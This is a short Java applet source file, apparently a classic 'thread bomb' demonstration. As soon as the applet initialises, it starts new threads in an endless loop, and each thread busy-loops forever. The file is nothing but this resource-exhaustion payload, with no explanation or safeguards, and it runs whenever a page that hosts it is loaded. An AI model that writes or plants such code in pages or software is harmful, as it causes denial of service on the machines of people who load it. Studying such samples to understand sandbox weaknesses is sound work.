import java.applet.Applet;

public class BombApplet extends Applet {
  public void init() {
    while (true) {
      new Thread(new Runnable() {
          public void run() {
            while(true) {}
          }
      }).start();
    }
  }
}
